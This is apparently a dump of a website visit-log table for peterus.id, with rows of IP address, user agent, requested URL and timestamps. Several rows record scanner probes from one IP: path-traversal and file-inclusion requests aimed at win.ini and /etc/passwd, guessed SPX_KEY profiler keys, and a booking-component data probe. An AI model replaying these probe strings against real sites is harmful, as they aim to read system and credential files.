(485, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://peterus.id', '2025-06-27 16:14:32', '2025-06-27 16:14:32'),
(486, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', 'https://peterus.id', '2025-06-27 16:15:44', '2025-06-27 16:15:44'),
(487, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 16:16:02', '2025-06-27 16:16:02'),
(488, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 16:17:45', '2025-06-27 16:17:45'),
(489, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 16:18:01', '2025-06-27 16:18:01'),
(490, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id/?SPX_KEY=testing&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(491, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id/?SPX_KEY=stg&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(492, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'https://peterus.id/?SPX_KEY=prd&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(493, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id/?SPX_KEY=spx&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(494, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15', 'https://peterus.id/?SPX_KEY=staging&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(495, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/108.0 Safari/537.36', 'https://peterus.id/?SPX_KEY=stag&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(496, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id/?SPX_KEY=dev&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(497, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://peterus.id/?SPX_KEY=devel&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(498, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15', 'https://peterus.id/?SPX_KEY=test&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(499, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15', 'https://peterus.id/?SPX_KEY=production&SPX_UI_URI=%2F', '2025-06-27 16:21:53', '2025-06-27 16:21:53'),
(500, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id', '2025-06-27 16:21:54', '2025-06-27 16:21:54'),
(501, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id/?SPX_KEY=prod&SPX_UI_URI=%2F', '2025-06-27 16:21:54', '2025-06-27 16:21:54'),
(502, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 16:23:36', '2025-06-27 16:23:36'),
(503, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/114.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 16:24:08', '2025-06-27 16:24:08'),
(504, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://www.peterus.id', '2025-06-27 16:24:34', '2025-06-27 16:24:34'),
(505, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://www.peterus.id', '2025-06-27 16:25:16', '2025-06-27 16:25:16'),
(506, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 16:26:02', '2025-06-27 16:26:02'),
(507, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 16:26:48', '2025-06-27 16:26:48'),
(508, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id', '2025-06-27 16:27:01', '2025-06-27 16:27:01'),
(509, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 16:28:34', '2025-06-27 16:28:34'),
(510, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id/?SPX_KEY=prod&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(511, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/?SPX_KEY=stag&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(512, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0', 'https://www.peterus.id/?SPX_KEY=test&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(513, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0', 'https://www.peterus.id/?SPX_KEY=testing&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(514, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id/?SPX_KEY=dev&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(515, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id/?SPX_KEY=production&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(516, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id/?SPX_KEY=spx&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(517, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id/?SPX_KEY=staging&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(518, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/?SPX_KEY=devel&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(519, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15', 'https://www.peterus.id/?SPX_KEY=prd&SPX_UI_URI=%2F', '2025-06-27 16:29:06', '2025-06-27 16:29:06'),
(520, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id/?SPX_KEY=stg&SPX_UI_URI=%2F', '2025-06-27 16:29:07', '2025-06-27 16:29:07'),
(521, '156.246.17.42', NULL, 'https://peterus.id', '2025-06-27 16:48:00', '2025-06-27 16:48:00'),
(522, '156.246.17.42', NULL, 'https://peterus.id', '2025-06-27 16:48:09', '2025-06-27 16:48:09'),
(523, '156.246.17.42', NULL, 'https://www.peterus.id', '2025-06-27 16:55:34', '2025-06-27 16:55:34'),
(524, '156.246.17.42', NULL, 'https://www.peterus.id', '2025-06-27 16:55:43', '2025-06-27 16:55:43'),
(525, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/115.0 Safari/537.36', 'https://peterus.id', '2025-06-27 17:01:20', '2025-06-27 17:01:20'),
(526, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 17:08:23', '2025-06-27 17:08:23'),
(527, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://peterus.id/?url=..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(528, '156.246.17.42', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50', 'https://peterus.id/?redirect=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(529, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/index.php?page=windows%2Fwin.ini%00', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(530, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://peterus.id/index.php?page=windows%2Fwin.ini', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(531, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/index.php?page=..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(532, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id/?page=..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(533, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id/index.php?page=....%2F%2F....%2F%2Fwindows%2Fwin.ini', '2025-06-27 17:39:15', '2025-06-27 17:39:15'),
(534, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id/?url=..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(535, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id/index.php?page=....%2F%2F....%2F%2Fwindows%2Fwin.ini', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(536, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Safari/605.1.15', 'https://www.peterus.id/?redirect=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(537, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?page=..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(538, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?page=windows%2Fwin.ini%00', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(539, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://www.peterus.id/?page=..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(540, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://www.peterus.id/index.php?page=windows%2Fwin.ini', '2025-06-27 17:50:47', '2025-06-27 17:50:47'),
(541, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id/?pjxo5b=1', '2025-06-27 17:53:12', '2025-06-27 17:53:12'),
(542, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id/?pjxo5b=1', '2025-06-27 17:53:31', '2025-06-27 17:53:31'),
(543, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'https://peterus.id/index.php?page=etc%2Fpasswd', '2025-06-27 17:59:40', '2025-06-27 17:59:40'),
(544, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://peterus.id/index.php?page=etc%2Fpasswd%00', '2025-06-27 17:59:40', '2025-06-27 17:59:40'),
(545, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id/index.php?page=..%2F..%2Fetc%2Fpasswd', '2025-06-27 17:59:40', '2025-06-27 17:59:40'),
(546, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id/index.php?page=....%2F%2F....%2F%2Fetc%2Fpasswd', '2025-06-27 17:59:40', '2025-06-27 17:59:40'),
(547, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15', 'https://www.peterus.id/?pjxo5b=1', '2025-06-27 18:08:34', '2025-06-27 18:08:34'),
(548, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id/?pjxo5b=1', '2025-06-27 18:08:50', '2025-06-27 18:08:50'),
(549, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 18:08:58', '2025-06-27 18:08:58'),
(550, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 18:09:45', '2025-06-27 18:09:45'),
(551, '156.246.17.42', 'Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 18:09:45', '2025-06-27 18:09:45'),
(552, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?page=etc%2Fpasswd', '2025-06-27 18:15:13', '2025-06-27 18:15:13'),
(553, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id/index.php?page=etc%2Fpasswd%00', '2025-06-27 18:15:13', '2025-06-27 18:15:13'),
(554, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15', 'https://www.peterus.id/index.php?page=....%2F%2F....%2F%2Fetc%2Fpasswd', '2025-06-27 18:15:13', '2025-06-27 18:15:13'),
(555, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id/index.php?page=..%2F..%2Fetc%2Fpasswd', '2025-06-27 18:15:13', '2025-06-27 18:15:13'),
(556, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 18:17:38', '2025-06-27 18:17:38'),
(557, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15', 'https://peterus.id/index.php?controller=customer&id=123&option=com_booking&task=getUserData', '2025-06-27 18:21:31', '2025-06-27 18:21:31'),
(558, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 18:24:14', '2025-06-27 18:24:14'),
(559, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 18:24:14', '2025-06-27 18:24:14'),
(560, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 18:26:49', '2025-06-27 18:26:49'),
(561, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 18:28:14', '2025-06-27 18:28:14'),
(562, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?controller=customer&id=123&option=com_booking&task=getUserData', '2025-06-27 18:28:15', '2025-06-27 18:28:15'),
(563, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id', '2025-06-27 18:33:48', '2025-06-27 18:33:48'),
(564, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 18:35:13', '2025-06-27 18:35:13'),
(565, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-27 18:35:34', '2025-06-27 18:35:34'),
(566, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 18:48:43', '2025-06-27 18:48:43'),
(567, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 18:48:50', '2025-06-27 18:48:50'),
(568, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36', 'https://peterus.id/?cb=90679', '2025-06-27 18:52:30', '2025-06-27 18:52:30'),
(569, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id/?cb=90679', '2025-06-27 18:52:41', '2025-06-27 18:52:41'),
(570, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id', '2025-06-27 18:58:59', '2025-06-27 18:58:59'),
(571, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/104.0 Safari/537.36', 'https://www.peterus.id/?cb=90679', '2025-06-27 19:02:57', '2025-06-27 19:02:57'),
(572, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id/?cb=90679', '2025-06-27 19:03:08', '2025-06-27 19:03:08'),
(573, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id/?cb=99351', '2025-06-27 19:04:06', '2025-06-27 19:04:06'),
(574, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15', 'https://peterus.id/?cb=99351', '2025-06-27 19:04:18', '2025-06-27 19:04:18'),
(575, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0', 'https://peterus.id/?cb=99351', '2025-06-27 19:04:29', '2025-06-27 19:04:29'),
(576, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://peterus.id/?cb=12077', '2025-06-27 19:06:39', '2025-06-27 19:06:39'),
(577, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id/?cb=12077', '2025-06-27 19:06:51', '2025-06-27 19:06:51'),
(578, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://peterus.id/?cb=12077', '2025-06-27 19:07:02', '2025-06-27 19:07:02'),
(579, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-27 19:11:30', '2025-06-27 19:11:30'),
(580, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id', '2025-06-27 19:12:02', '2025-06-27 19:12:02'),
(581, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://www.peterus.id', '2025-06-27 19:16:50', '2025-06-27 19:16:50'),
(582, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-27 19:17:08', '2025-06-27 19:17:08'),
(583, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 19:17:22', '2025-06-27 19:17:22'),
(584, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id/?cb=99351', '2025-06-27 19:19:12', '2025-06-27 19:19:12'),
(585, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id/?cb=99351', '2025-06-27 19:19:24', '2025-06-27 19:19:24'),
(586, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Safari/605.1.15', 'https://www.peterus.id/?cb=99351', '2025-06-27 19:19:35', '2025-06-27 19:19:35'),
(587, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 19:20:32', '2025-06-27 19:20:32'),
(588, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/608.2.11 (KHTML, like Gecko) Version/13 Safari/608.2.11', 'https://www.peterus.id/?cb=12077', '2025-06-27 19:21:44', '2025-06-27 19:21:44'),
(589, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id/?cb=12077', '2025-06-27 19:21:57', '2025-06-27 19:21:57'),
(590, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id/?cb=12077', '2025-06-27 19:22:09', '2025-06-27 19:22:09'),
(591, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 19:24:21', '2025-06-27 19:24:21'),
(592, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 19:25:37', '2025-06-27 19:25:37'),
(593, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 19:26:45', '2025-06-27 19:26:45'),
(594, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 19:29:28', '2025-06-27 19:29:28'),
(595, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15', 'https://peterus.id', '2025-06-27 19:29:38', '2025-06-27 19:29:38'),
(596, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id', '2025-06-27 19:34:44', '2025-06-27 19:34:44'),
(597, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 20:02:12', '2025-06-27 20:02:12'),
(598, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'https://peterus.id/index.php?page=home', '2025-06-27 20:02:36', '2025-06-27 20:02:36'),
(599, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Safari/605.1.15', 'https://peterus.id', '2025-06-27 20:03:32', '2025-06-27 20:03:32'),
(600, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 20:03:39', '2025-06-27 20:03:39'),
